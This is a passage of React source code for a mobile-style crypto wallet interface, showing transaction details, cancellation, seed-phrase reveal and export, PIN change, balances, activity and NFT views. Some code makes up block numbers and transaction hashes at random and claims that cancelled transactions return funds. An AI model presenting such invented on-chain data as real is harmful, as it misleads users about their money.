    <div style={{position:"fixed",inset:0,zIndex:101,display:"flex",alignItems:"center",justifyContent:"center",background:"rgba(0,0,0,0.85)",backdropFilter:"blur(10px)",animation:"fadeIn 0.3s ease"}}>

      <div style={{background:"#1a1a1a",borderRadius:28,padding:"36px 28px",width:"90%",maxWidth:320,border:"1px solid rgba(34,197,94,0.3)",boxShadow:"0 20px 60px rgba(34,197,94,0.2)",textAlign:"center",animation:"slideUp 0.4s ease"}}>

        <div style={{width:80,height:80,borderRadius:"50%",background:"linear-gradient(135deg,#22C55E,#16a34a)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 20px",boxShadow:"0 8px 32px rgba(34,197,94,0.4)",animation:"pulse 2s infinite"}}>

          <Check size={40} color="#fff" strokeWidth={3}/>

        </div>

        <h3 style={{fontSize:22,fontWeight:700,color:"#fff",margin:"0 0 10px"}}>Transaction Cancelled</h3>

        <p style={{fontSize:14,color:"rgba(255,255,255,0.5)",margin:"0 0 24px",lineHeight:1.5}}>

          Your transaction has been successfully cancelled. Funds have been returned to your wallet.

        </p>

        <button onClick={onClose}

          style={{width:"100%",padding:"16px",borderRadius:16,border:"none",background:"#22C55E",color:"#fff",fontSize:16,fontWeight:600,cursor:"pointer",boxShadow:"0 4px 16px rgba(34,197,94,0.3)"}}>

          Got it

        </button>

      </div>

    </div>

  );

}



// ─── TX DETAIL ────────────────────────────────────────────────────────────────

function TxDetail({ tx, onClose, onCancel }) {
  const [copied,setCopied]=useState(false);
  const [showHash,setShowHash]=useState(false);
  const [showCancelConfirm,setShowCancelConfirm]=useState(false);
  const [showDeclinedSuccess,setShowDeclinedSuccess]=useState(false);

  const [timeLeft,setTimeLeft]=useState(()=>tx.cancelTime?Math.max(0,tx.cancelTime-Date.now()):0);

  const icons={receive:ArrowDownLeft,send:ArrowUpRight,swap:ArrowLeftRight};

  const Icon=icons[tx.type]||ArrowUpRight;

  const statusColors={confirmed:"#22C55E",pending:"#F59E0B",failed:"#EF4444",declined:"#EF4444"};

  const status = tx.status||"confirmed";

  

  function handleCancel() {

    onCancel(tx.id);

    setShowDeclinedSuccess(true);

  }



  useEffect(()=>{

    if(tx.status!=="pending"||!tx.cancelTime)return;

    const interval=setInterval(()=>{

      const left=Math.max(0,tx.cancelTime-Date.now());

      setTimeLeft(left);

      if(left===0)clearInterval(interval);

    },1000);

    return()=>clearInterval(interval);

  },[tx.status,tx.cancelTime]);

  return (

    <Sheet onClose={onClose} title="Transaction Details">

      <div style={{padding:"20px 24px",display:"flex",flexDirection:"column",gap:10}}>

        <div style={{textAlign:"center",padding:"12px 0 20px"}}>

          <div style={{width:56,height:56,borderRadius:"50%",

            background:tx.type==="send"?"#2d0c0c":tx.type==="receive"?"#052e16":"#0d1033",

            display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 10px",

            border:`1px solid ${tx.color}44`}}>

            <Icon size={24} color={tx.color}/>

          </div>

          <p style={{fontSize:24,fontWeight:700,color:tx.type==="send"?"#EF4444":"#22C55E",margin:0}}>{tx.usd}</p>

          <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:"4px 0 0",textTransform:"capitalize"}}>{tx.type} · {tx.label}</p>

          <div style={{display:"inline-flex",alignItems:"center",gap:6,background:statusColors[status]+"22",

            borderRadius:20,padding:"4px 12px",marginTop:10,border:`1px solid ${statusColors[status]}44`}}>

            <div style={{width:6,height:6,borderRadius:"50%",background:statusColors[status]}}/>

            <span style={{fontSize:12,color:statusColors[status],fontWeight:600,textTransform:"capitalize"}}>{status}</span>

          </div>

        </div>

        {[status==="declined"?["Status","❌ Declined"]:["Status",status==="confirmed"?"✅ Confirmed":status==="pending"?"⏳ Pending":"❌ Failed"],

          ["Time",tx.time],["Address",tx.addr],["Fee","~$0.84"],

          tx.status==="pending"&&timeLeft>0?["Cancel in",`${Math.floor(timeLeft/60000)}m ${Math.floor((timeLeft%60000)/1000)}s`]:null,

          ["Block",tx.block||"#"+Math.floor(19000000+Math.random()*500000).toLocaleString()]].filter(Boolean).map(([k,v])=>(

          <div key={k} style={{display:"flex",justifyContent:"space-between",padding:"12px 16px",background:"#1a1a1a",borderRadius:12}}>

            <span style={{fontSize:13,color:"rgba(255,255,255,0.45)"}}>{k}</span>

            <span style={{fontSize:13,color:"#fff",fontWeight:500}}>{v}</span>

          </div>

        ))}

        <div style={{background:"#1a1a1a",borderRadius:12,padding:"12px 16px"}}>
          <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:4}}>
            <p style={{fontSize:11,color:"rgba(255,255,255,0.35)",margin:0}}>TX Hash</p>
            <button onClick={()=>setShowHash(!showHash)} style={{background:"none",border:"none",padding:4,cursor:"pointer",display:"flex",alignItems:"center",justifyContent:"center"}}>
              {showHash ? <EyeOff size={14} color="rgba(255,255,255,0.4)"/> : <Eye size={14} color="rgba(255,255,255,0.4)"/>}
            </button>
          </div>
          <p style={{fontSize:11,color:"rgba(255,255,255,0.6)",margin:0,fontFamily:"monospace",wordBreak:"break-all",filter:showHash?"none":"blur(4px)",transition:"filter 0.2s"}}>
            {tx.hash||genTxHash()}
          </p>
        </div>

        {showCancelConfirm&&(

          <CancelConfirmModal 

            tx={tx} 

            onConfirm={handleCancel} 

            onClose={()=>setShowCancelConfirm(false)}/>

        )}

        {showDeclinedSuccess&&(

          <TxDeclinedSuccessModal onClose={()=>{setShowDeclinedSuccess(false);onClose();}}/>

        )}

        {status==="pending"&&onCancel&&(

          <button onClick={()=>setShowCancelConfirm(true)}

            style={{width:"100%",padding:"14px",borderRadius:14,border:"1px solid #EF444444",

              background:"#EF444422",color:"#EF4444",

              fontSize:14,fontWeight:600,cursor:"pointer",display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>

            <X size={15}/> Cancel Transaction

          </button>

        )}

        <button onClick={()=>{

            if(tx.hash&&navigator.clipboard)navigator.clipboard.writeText(tx.hash);

            setCopied(true);setTimeout(()=>setCopied(false),2000);

          }}

          style={{width:"100%",padding:"14px",borderRadius:14,border:"1px solid rgba(255,255,255,0.1)",

            background:"rgba(255,255,255,0.04)",color:copied?"#22C55E":"rgba(255,255,255,0.6)",

            fontSize:14,fontWeight:500,cursor:"pointer",display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>

          {copied?<><Check size={15}/>Copied!</>:<><Copy size={15}/>Copy TX Hash</>}

        </button>

      </div>

    </Sheet>

  );

}



// ─── SETTINGS MODALS ──────────────────────────────────────────────────────────

function RecoveryModal({ onClose, mnemonic }) {

  const [rev,setRev]=useState(false);

  const [cop,setCop]=useState(false);

  return (

    <Sheet onClose={onClose} title="Recovery Phrase">

      <div style={{padding:"16px 24px",display:"flex",flexDirection:"column",gap:14}}>

        <div style={{background:"#0f0a00",borderRadius:12,padding:14,border:"1px solid rgba(245,158,11,0.2)"}}>

          <p style={{fontSize:12,color:"rgba(245,158,11,0.8)",margin:0,lineHeight:1.6}}>

            ⚠ Never share your seed phrase. Anyone with these words has full access to your wallet.

          </p>

        </div>

        <div style={{background:"#0a0a0a",borderRadius:16,padding:16,position:"relative",overflow:"hidden"}}>

          {!rev&&(

            <div style={{position:"absolute",inset:0,backdropFilter:"blur(12px)",background:"rgba(0,0,0,0.7)",

              borderRadius:16,zIndex:10,display:"flex",flexDirection:"column",alignItems:"center",

              justifyContent:"center",gap:10}}>

              <Lock size={22} color="rgba(255,255,255,0.4)"/>

              <button onClick={()=>setRev(true)} style={{padding:"10px 24px",borderRadius:12,

                border:"1px solid rgba(255,255,255,0.15)",background:"rgba(255,255,255,0.08)",

                color:"#fff",fontSize:13,fontWeight:500,cursor:"pointer"}}>Tap to Reveal</button>

            </div>

          )}

          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:8,filter:rev?"none":"blur(8px)"}}>
          {mnemonic.length === 0 && (
            <div style={{gridColumn: "1/-1", textAlign: "center", padding: "20px", color: "rgba(255,255,255,0.4)"}}>
              Генерация фразы...
            </div>
          )}
          {mnemonic.map((w,i)=>(

              <div key={i} style={{background:"#161616",borderRadius:8,padding:"7px 10px",

                display:"flex",alignItems:"center",gap:6,border:"1px solid rgba(255,255,255,0.06)"}}>

                <span style={{fontSize:10,color:"rgba(255,255,255,0.25)",minWidth:14}}>{i+1}</span>

                <span style={{fontSize:12,color:"#fff",fontWeight:500}}>{w}</span>

              </div>

            ))}

          </div>

        </div>

        {rev&&(

          <div style={{display:"flex",flexDirection:"column",gap:10}}>

            <button onClick={()=>{

                navigator.clipboard&&navigator.clipboard.writeText(mnemonic.join(" "));

                setCop(true);setTimeout(()=>setCop(false),2000);

              }}

              style={{width:"100%",padding:"14px",borderRadius:14,border:"1px solid rgba(255,255,255,0.1)",

                background:"rgba(255,255,255,0.04)",color:cop?"#22C55E":"rgba(255,255,255,0.6)",

                fontSize:14,fontWeight:500,cursor:"pointer",display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>

              {cop?<><Check size={15}/>Copied!</>:<><Copy size={15}/>Copy to Clipboard</>}

            </button>

            <button onClick={()=>{

                const phrase = mnemonic.join(" ");

                const content = "GEM WALLET - RECOVERY PHRASE\n\nDO NOT SHARE THIS FILE WITH ANYONE!\n\nYour 12-word seed phrase:\n\n" + phrase + "\n\nStore this file in a safe place offline.\nAnyone with this phrase has full access to your wallet.\n\nExported: " + new Date().toLocaleString("ru-RU");

                const blob = new Blob([content], {type:"text/plain"});

                const url = URL.createObjectURL(blob);

                const a = document.createElement("a");

                a.href = url;

                a.download = "gem-wallet-recovery-phrase.txt";

                a.click();

                URL.revokeObjectURL(url);

              }}

              style={{width:"100%",padding:"14px",borderRadius:14,border:"1px solid rgba(37,99,235,0.4)",

                background:"rgba(37,99,235,0.12)",color:"#60a5fa",

                fontSize:14,fontWeight:500,cursor:"pointer",display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>

              <Download size={15}/>Export Wallet (Save File)

            </button>

          </div>

        )}

      </div>

    </Sheet>

  );

}



function NotifModal({ onClose }) {

  const [s,setS]=useState({price:true,tx:true,news:false,security:true});

  return (

    <Sheet onClose={onClose} title="Notifications">

      <div style={{padding:"16px 24px",display:"flex",flexDirection:"column",gap:4}}>

        {[["price","Price Alerts","Big price changes"],["tx","Transactions","Incoming & outgoing"],

          ["news","Market News","Daily summaries"],["security","Security Alerts","Unusual activity"]].map(([k,l,sub])=>(

          <div key={k} style={{display:"flex",alignItems:"center",gap:14,padding:"14px 0",borderBottom:"1px solid rgba(255,255,255,0.04)"}}>

            <div style={{flex:1}}>

              <p style={{fontSize:14,fontWeight:500,color:"#fff",margin:0}}>{l}</p>

              <p style={{fontSize:12,color:"rgba(255,255,255,0.35)",margin:0}}>{sub}</p>

            </div>

            <div onClick={()=>setS(x=>({...x,[k]:!x[k]}))}

              style={{width:48,height:28,borderRadius:14,background:s[k]?"#2563eb":"#333",

                cursor:"pointer",transition:"background 0.2s",position:"relative",flexShrink:0}}>

              <div style={{width:22,height:22,borderRadius:"50%",background:"#fff",

                position:"absolute",top:3,left:s[k]?22:3,transition:"left 0.2s"}}/>

            </div>

          </div>

        ))}

        <button onClick={onClose} style={{width:"100%",padding:"16px",borderRadius:16,border:"none",

          background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:15,

          fontWeight:600,cursor:"pointer",marginTop:12}}>Save Settings</button>

      </div>

    </Sheet>

  );

}



function ChangePinModal({ onClose, onChangePin }) {

  const [step,setStep]=useState("old"); // old | new | confirm

  const [old,setOld]=useState([]);

  const [newPin,setNewPin]=useState([]);

  const [confirmPin,setConfirmPin]=useState([]);

  const [error,setError]=useState("");

  const [savedPin,] = useState(()=>localStorage.getItem(storageKey("gem_pin"))||"");



  function press(d, which, setter, current) {

    if(current.length>=6)return;

    const next=[...current,d];

    setter(next);

    if(next.length===6) {

      setTimeout(()=>{

        if(which==="old") {

          if(!savedPin||next.join("")===savedPin){setStep("new");setOld(next);}

          else{setError("Wrong PIN");setter([]);}

        } else if(which==="new") {

          setStep("confirm");setNewPin(next);

        } else {

          if(next.join("")===newPin.join("")){

            onChangePin(next.join(""));onClose();

          } else {

            setError("PINs don't match");setter([]);setStep("new");setNewPin([]);

          }

        }

      },150);

    }

  }



  const titles={old:"Current PIN",new:"New PIN",confirm:"Confirm New PIN"};

  const descs={old:"Enter your current PIN",new:"Choose a new 6-digit PIN",confirm:"Confirm your new PIN"};

  const which=step;

  const current=which==="old"?old:which==="new"?newPin:confirmPin;

  const setter=which==="old"?setOld:which==="new"?setNewPin:setConfirmPin;



  return (

    <Sheet onClose={onClose} title="Change PIN">

      <div style={{padding:"32px 24px",display:"flex",flexDirection:"column",alignItems:"center",gap:20}}>

        <div><p style={{fontSize:16,fontWeight:600,color:"#fff",margin:"0 0 4px",textAlign:"center"}}>{titles[step]}</p>

          <p style={{fontSize:13,color:"rgba(255,255,255,0.4)",margin:0,textAlign:"center"}}>{descs[step]}</p></div>

        {error&&<p style={{color:"#EF4444",fontSize:13,margin:0}}>{error}</p>}

        <div style={{display:"flex",gap:12}}>

          {Array.from({length:6},(_,i)=>(

            <div key={i} style={{width:14,height:14,borderRadius:"50%",

              background:i<current.length?"#2563eb":"rgba(255,255,255,0.15)",

              transition:"background 0.15s",border:"1.5px solid rgba(255,255,255,0.1)"}}/>

          ))}

        </div>

        <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:12,maxWidth:280,width:"100%"}}>

          {[1,2,3,4,5,6,7,8,9,"",0,"⌫"].map((k,i)=>(

            <button key={i} onClick={()=>k==="⌫"?setter(c=>c.slice(0,-1)):k!==""?press(String(k),which,setter,current):null}

              disabled={k===""}

              style={{height:64,borderRadius:16,border:"none",

                background:k===""?"transparent":k==="⌫"?"rgba(255,255,255,0.06)":"rgba(255,255,255,0.08)",

                color:"#fff",fontSize:k==="⌫"?18:22,fontWeight:500,cursor:k===""?"default":"pointer"}}>

              {k}

            </button>

          ))}

        </div>

      </div>

    </Sheet>

  );

}

function WalletTab({ assets, prices, liveStatus, onSend, onReceive, onSwap, onBuy, onRefresh, balances, setBalances, testMode }) {

  const [hidden,setHidden]=useState(false);

  const [selAsset,setSelAsset]=useState(null);

  const total = assets.reduce((s,a)=>s+a.balance*(prices[a.sym]||0),0);

  

  // Avatar state from localStorage (sync with SettingsTab)

  const [avatar,setAvatar]=useState(()=>localStorage.getItem(storageKey("avatar"))||"crystal");

  const [avatarBg,setAvatarBg]=useState(()=>localStorage.getItem(storageKey("avatarBg"))||"graphite");

  

  // Listen for storage changes to update avatar in real-time

  useEffect(()=>{

    const handleStorage=()=>{

      setAvatar(localStorage.getItem(storageKey("avatar"))||"crystal");

      setAvatarBg(localStorage.getItem(storageKey("avatarBg"))||"graphite");

    };

    window.addEventListener("storage",handleStorage);

    return()=>window.removeEventListener("storage",handleStorage);

  },[]);

  

  const bgOptions={

    graphite:"linear-gradient(135deg,#374151,#1f2937)",

    gradient:"linear-gradient(135deg,#2563eb,#7c3aed)",

    purple:"linear-gradient(135deg,#7c3aed,#ec4899)",

    green:"linear-gradient(135deg,#22C55E,#16a34a)",

    orange:"linear-gradient(135deg,#F59E0B,#EF4444)",

    dark:"linear-gradient(135deg,#1f2937,#111827)",

    blue:"linear-gradient(135deg,#0ea5e9,#2563eb)",

  };

  const currentBg=bgOptions[avatarBg]||bgOptions.graphite;

  

  const avatarIcons={

    crystal:<CrystalIcon size={44}/>,

    gem:<GemLogo size={24}/>,

    diamond:<Diamond size={24} color="#2563eb"/>,

    user:<UserCircle size={24} color="#8B9CF7"/>,

    zap:<Zap size={24} color="#F59E0B"/>,

  };

  const currentAvatar=avatarIcons[avatar]||avatarIcons.crystal;

  const totalChg = assets.reduce((s,a)=>s+(a.chg||0)*a.balance*(prices[a.sym]||0),0)/total;



  return (

    <div style={{padding:"0 16px 100px"}}>

      {selAsset&&<AssetDetail asset={selAsset} prices={prices} onClose={()=>setSelAsset(null)} onSend={onSend} onReceive={onReceive}/>}

      <div style={{textAlign:"center",padding:"8px 0 28px",animation:"fadeUp 0.5s ease both"}}>

        <div style={{display:"flex",justifyContent:"center",marginBottom:16}}>

          <div style={{width:60,height:60,borderRadius:18,background:currentBg,display:"flex",alignItems:"center",justifyContent:"center",

            border:"2px solid rgba(255,255,255,0.1)"}}>

            {currentAvatar}

          </div>

        </div>

        <div style={{display:"flex",alignItems:"center",justifyContent:"center",gap:8,marginBottom:4}}>

          <span style={{fontSize:13,color:"rgba(255,255,255,0.4)"}}>Total Balance</span>

          <button onClick={()=>setHidden(h=>!h)} style={{background:"none",border:"none",cursor:"pointer",padding:2}}>

            {hidden?<EyeOff size={14} color="rgba(255,255,255,0.3)"/>:<Eye size={14} color="rgba(255,255,255,0.3)"/>}

          </button>

          <button onClick={onRefresh} style={{background:"none",border:"none",cursor:"pointer",padding:2}}>

            <RefreshCw size={13} color={liveStatus==="loading"?"#2563eb":"rgba(255,255,255,0.3)"} style={{animation:liveStatus==="loading"?"spin 1s linear infinite":"none"}}/>

          </button>

        </div>

        <p style={{fontSize:40,fontWeight:700,color:"#fff",margin:"0 0 6px",

          letterSpacing:"-0.03em",filter:hidden?"blur(10px)":"none",transition:"filter 0.3s"}}>

          {hidden?"$••••••":fmtUSD(total)}

        </p>

        <div style={{display:"flex",alignItems:"center",justifyContent:"center",gap:6}}>

          {totalChg>=0?<TrendingUp size={14} color="#22C55E"/>:<TrendingDown size={14} color="#EF4444"/>}

          <span style={{fontSize:13,color:totalChg>=0?"#22C55E":"#EF4444",fontWeight:600}}>

            {totalChg>=0?"+":""}{totalChg.toFixed(2)}% 24h

          </span>

          {liveStatus==="live"&&<span style={{fontSize:10,color:"#22C55E",background:"#22C55E22",borderRadius:20,padding:"1px 6px"}}>LIVE</span>}

        </div>

      </div>

      <div style={{display:"flex",justifyContent:"space-around",padding:"0 8px",marginBottom:32}}>

        <ActionBtn icon={<ArrowUpRight size={22} color="#fff"/>} label="Send" onClick={onSend} color="#2563EB"/>

        <ActionBtn icon={<ArrowDownLeft size={22} color="#fff"/>} label="Receive" onClick={onReceive} color="#7c3aed"/>

        <ActionBtn icon={<ArrowLeftRight size={22} color="#fff"/>} label="Swap" onClick={onSwap} color="#D97706"/>

        <ActionBtn icon={<ShoppingCart size={22} color="#fff"/>} label="Buy" onClick={onBuy} color="#22C55E"/>

      </div>

      <span style={{fontSize:15,fontWeight:600,color:"#fff",display:"block",marginBottom:14,padding:"0 4px"}}>Assets</span>

      <div style={{display:"flex",flexDirection:"column",gap:2}}>

        {assets.map((a,i)=>{

          const price=prices[a.sym]||0;

          const val=a.balance*price;

          const pos=a.chg>=0;

          return (

            <div key={a.id} onClick={()=>setSelAsset(a)}

              style={{display:"flex",alignItems:"center",gap:14,padding:"14px 16px",borderRadius:16,

                cursor:"pointer",transition:"background 0.15s",

                animation:`fadeUp 0.45s ${0.05*i}s ease both`,opacity:0,animationFillMode:"forwards"}}

              onMouseEnter={e=>e.currentTarget.style.background="#161616"}

              onMouseLeave={e=>e.currentTarget.style.background="transparent"}>

              <CoinIcon asset={a}/>

              <div style={{flex:1,minWidth:0}}>

                <div style={{display:"flex",justifyContent:"space-between"}}>

                  <span style={{fontSize:15,fontWeight:600,color:"#fff"}}>{a.name}</span>

                  <span style={{fontSize:15,fontWeight:600,color:"#fff",filter:hidden?"blur(8px)":"none"}}>{hidden?"••••":fmtUSD(val)}</span>

                </div>

                <div style={{display:"flex",justifyContent:"space-between",marginTop:3}}>

                  <span style={{fontSize:13,color:"rgba(255,255,255,0.4)"}}>

                    {fmtUSD(price)}<span style={{color:pos?"#22C55E":"#EF4444",marginLeft:4,fontWeight:500}}>{pos?"+":""}{a.chg?.toFixed(2)}%</span>

                  </span>

                  <span style={{fontSize:13,color:"rgba(255,255,255,0.4)"}}>{hidden?"••••":`${fmt(a.balance,6)} ${a.sym}`}</span>

                </div>

              </div>

            </div>

          );

        })}

      </div>

    </div>

  );

}





// ─── ACTIVITY TAB ─────────────────────────────────────────────────────────────

function ActivityTab({ txHistory, onCancelTx, onCreateTx, addresses, prices }) {

  const [sel,setSel]=useState(null);

  const [filter,setFilter]=useState("all");

  const [showAddTx,setShowAddTx]=useState(false);

  const icons={receive:ArrowDownLeft,send:ArrowUpRight,swap:ArrowLeftRight};

  const bg={receive:"#052e16",send:"#2d0c0c",swap:"#0d1033"};

  const statusColors={confirmed:"#22C55E",pending:"#F59E0B",failed:"#EF4444",declined:"#EF4444"};

  // Safe filter with null check

  const safeTxHistory = Array.isArray(txHistory) ? txHistory : [];

  const filtered = filter==="all"?safeTxHistory:filter==="declined"?safeTxHistory.filter(t=>t?.status==="declined"):safeTxHistory.filter(t=>t?.type===filter);

  

  const getStatusIcon = (status) => {

    if(status==="confirmed")return <CheckCircle size={12} color="#22C55E"/>;

    if(status==="pending")return <Clock size={12} color="#F59E0B"/>;

    return <AlertCircle size={12} color="#EF4444"/>;

  };



  return (

    <div style={{padding:"0 16px 100px"}}>

      {sel&&<TxDetail tx={sel} onClose={()=>setSel(null)} onCancel={onCancelTx}/>}

      <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:20,padding:"0 4px",flexWrap:"wrap"}}>
        <span style={{fontSize:17,fontWeight:700,color:"#fff",flex:1}}>Activity</span>
        {["all","send","receive","swap","declined"].map(f=>(
          <button key={f} onClick={()=>setFilter(f)}
            style={{padding:"8px 14px",borderRadius:20,border:"none",cursor:"pointer",fontSize:12,fontWeight:600,
              background:filter===f?"#2563eb":"#1a1a1a",color:filter===f?"#fff":"rgba(255,255,255,0.5)",
              transition:"all 0.2s",boxShadow:filter===f?"0 4px 14px rgba(37,99,235,0.3)":"none"}}>
            {f==="declined"?"Declined":f.charAt(0).toUpperCase()+f.slice(1)}
          </button>
        ))}
      </div>

      {filtered.length===0&&(

        <div style={{textAlign:"center",padding:"60px 24px"}}>

          <div style={{margin:"0 0 20px",display:"flex",justifyContent:"center"}}>

            <div style={{width:80,height:80,borderRadius:"50%",background:"linear-gradient(135deg,#1a1a1a,#252525)",display:"flex",alignItems:"center",justifyContent:"center",border:"1px solid rgba(255,255,255,0.05)"}}>

              <EmptyMailboxIcon size={40}/>

            </div>

          </div>

          <p style={{color:"rgba(255,255,255,0.5)",fontSize:15,fontWeight:500}}>No transactions yet</p>

          <p style={{color:"rgba(255,255,255,0.3)",fontSize:13,marginTop:6}}>Your transaction history will appear here</p>

        </div>

      )}

      {filtered.map((tx,i)=>{

        if (!tx || typeof tx !== 'object') return null;

        const Icon=icons[tx?.type]||ArrowUpRight;

        const isNegative = tx?.type==="send"||tx?.status==="declined";

        return (

          <div key={tx?.id||i} onClick={()=>tx&&setSel(tx)}

            style={{display:"flex",alignItems:"center",gap:14,padding:"16px 18px",borderRadius:18,

              cursor:"pointer",transition:"all 0.2s ease",

              background:"linear-gradient(145deg,#1a1a1a,#161616)",

              border:"1px solid rgba(255,255,255,0.04)",

              boxShadow:"0 2px 8px rgba(0,0,0,0.2)",

              marginBottom:10,

              animation:`fadeUp 0.4s ${0.06*i}s ease both`,opacity:0,animationFillMode:"forwards"}}

            onMouseEnter={e=>{

              e.currentTarget.style.background="linear-gradient(145deg,#1f1f1f,#1a1a1a)";

              e.currentTarget.style.transform="translateY(-2px)";

              e.currentTarget.style.boxShadow="0 4px 16px rgba(0,0,0,0.3)";

            }}

            onMouseLeave={e=>{

              e.currentTarget.style.background="linear-gradient(145deg,#1a1a1a,#161616)";

              e.currentTarget.style.transform="translateY(0)";

              e.currentTarget.style.boxShadow="0 2px 8px rgba(0,0,0,0.2)";

            }}>

            <div style={{width:48,height:48,borderRadius:14,background:bg[tx?.type]||"#1a1a1a",

              display:"flex",alignItems:"center",justifyContent:"center",border:`1px solid ${tx?.color||"#fff"}30`,flexShrink:0,

              boxShadow:`0 4px 12px ${tx?.color||"#fff"}20`}}>

              <Icon size={22} color={tx?.color||"#fff"}/>

            </div>

            <div style={{flex:1,minWidth:0}}>

              <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:4}}>

                <div style={{display:"flex",alignItems:"center",gap:8}}>

                  <span style={{fontSize:15,fontWeight:600,color:"#fff",textTransform:"capitalize"}}>

                    {tx?.type}

                  </span>

                  {tx?.status&&tx?.status!=="confirmed"&&(

                    <span style={{display:"flex",alignItems:"center",gap:4,fontSize:10,color:statusColors[tx?.status],

                      background:statusColors[tx?.status]+"15",padding:"3px 8px",borderRadius:6,textTransform:"capitalize",

                      fontWeight:600,border:`1px solid ${statusColors[tx?.status]}30`}}>

                      {getStatusIcon(tx?.status)}

                      {tx?.status}

                    </span>

                  )}

                </div>

                <span style={{fontSize:15,fontWeight:700,color:isNegative?"#EF4444":tx?.status==="pending"?"#F59E0B":"#22C55E"}}>

                  {isNegative?"-":"+"}{tx?.usd||""}

                </span>

              </div>

              <div style={{display:"flex",justifyContent:"space-between",alignItems:"center"}}>

                <span style={{fontSize:13,color:"rgba(255,255,255,0.4)",fontFamily:"monospace",letterSpacing:"-0.3px"}}>

                  {tx?.addr?.slice(0,8)}...{tx?.addr?.slice(-6)}

                </span>

                <span style={{fontSize:12,color:"rgba(255,255,255,0.35)"}}>{tx?.time||""}</span>

              </div>

              <span style={{fontSize:12,color:"rgba(255,255,255,0.3)",marginTop:2,display:"block"}}>{tx?.label||""}</span>

            </div>

            <ChevronRight size={16} color="rgba(255,255,255,0.15)"/>

          </div>

        );

      })}

    </div>

  );

}



// ─── NFT TAB ─────────────────────────────────────────────────────────────────

function NFTTab({ addresses }) {

  const [nfts,setNfts]=useState(()=>{

    const saved=localStorage.getItem(storageKey("nfts"));

    return saved?JSON.parse(saved):[];

  });

  const [showAdd,setShowAdd]=useState(false);

  const [newNft,setNewNft]=useState({name:"",contract:"",tokenId:"",network:"ETH",image:""});



  useEffect(()=>{

    localStorage.setItem(storageKey("nfts"),JSON.stringify(nfts));

  },[nfts]);



  function addNft() {

    if(!newNft.name||!newNft.contract) return;

    setNfts(prev=>[...prev,{...newNft,id:Date.now(),addedAt:new Date().toISOString()}]);

    setNewNft({name:"",contract:"",tokenId:"",network:"ETH",image:""});

    setShowAdd(false);

  }



  function removeNft(id) {

    setNfts(prev=>prev.filter(n=>n.id!==id));

  }



  const networks=["ETH","BNB","SOL","ARB","TON"];



  return (

    <div style={{padding:"0 16px 100px"}}>

      <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:16}}>

        <span style={{fontSize:15,fontWeight:600,color:"#fff"}}>My NFT Collection</span>

        <button onClick={()=>setShowAdd(!showAdd)} style={{width:36,height:36,borderRadius:"50%",background:"transparent",

          border:"none",display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer",padding:0}}>

          <NftAddIcon size={36}/>

        </button>

      </div>



      {showAdd&&(

        <div style={{background:"#111",borderRadius:16,padding:16,marginBottom:16,border:"1px solid rgba(255,255,255,0.08)"}}>

          <p style={{fontSize:13,color:"rgba(255,255,255,0.6)",margin:"0 0 12px"}}>Add NFT Manually</p>

          <input placeholder="NFT Name" value={newNft.name} onChange={e=>setNewNft({...newNft,name:e.target.value})}

            style={{width:"100%",padding:10,background:"#1a1a1a",border:"1px solid #333",borderRadius:8,color:"#fff",marginBottom:8,fontSize:13}}/>

          <input placeholder="Contract Address" value={newNft.contract} onChange={e=>setNewNft({...newNft,contract:e.target.value})}

            style={{width:"100%",padding:10,background:"#1a1a1a",border:"1px solid #333",borderRadius:8,color:"#fff",marginBottom:8,fontSize:13}}/>

          <input placeholder="Token ID" value={newNft.tokenId} onChange={e=>setNewNft({...newNft,tokenId:e.target.value})}

            style={{width:"100%",padding:10,background:"#1a1a1a",border:"1px solid #333",borderRadius:8,color:"#fff",marginBottom:8,fontSize:13}}/>

          <input placeholder="Image URL (optional)" value={newNft.image} onChange={e=>setNewNft({...newNft,image:e.target.value})}

            style={{width:"100%",padding:10,background:"#1a1a1a",border:"1px solid #333",borderRadius:8,color:"#fff",marginBottom:8,fontSize:13}}/>

          <div style={{display:"flex",gap:8,flexWrap:"wrap",marginBottom:12}}>

            {networks.map(n=> (

              <button key={n} onClick={()=>setNewNft({...newNft,network:n})}

                style={{padding:"6px 12px",borderRadius:8,border:"none",fontSize:12,

                  background:newNft.network===n?"#2563eb":"#333",color:"#fff",cursor:"pointer"}}>

                {n}

              </button>

            ))}

          </div>

          <button onClick={addNft} style={{width:"100%",padding:12,background:"#22C55E",border:"none",borderRadius:10,color:"#fff",fontWeight:600,cursor:"pointer"}}>

            Add NFT

          </button>

        </div>

      )}



      {nfts.length===0?(

        <div style={{textAlign:"center",padding:"60px 24px"}}>

          <div style={{margin:"0 auto 20px"}}>

            <NftPlaceholderIcon size={80}/>

          </div>

          <p style={{color:"rgba(255,255,255,0.5)",fontSize:14}}>No NFTs yet</p>

          <p style={{color:"rgba(255,255,255,0.3)",fontSize:12,marginTop:8}}>Add your NFTs manually or import from marketplaces</p>

        </div>

      ): (

        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12}}>

          {nfts.map(nft=> (

            <div key={nft.id} style={{background:"#111",borderRadius:16,overflow:"hidden",border:"1px solid rgba(255,255,255,0.06)"}}>

              <div style={{aspectRatio:"1",background:nft.image?`url(${nft.image}) center/cover`:"linear-gradient(135deg,#1e3a8a,#7c3aed)",display:"flex",alignItems:"center",justifyContent:"center"}}>

                {!nft.image&&<Image size={32} color="rgba(255,255,255,0.3)"/>}

              </div>

              <div style={{padding:12}}>

                <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:"0 0 4px",whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis"}}>{nft.name}</p>

                <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"0 0 4px"}}>{nft.network} • #{nft.tokenId||"-"}</p>

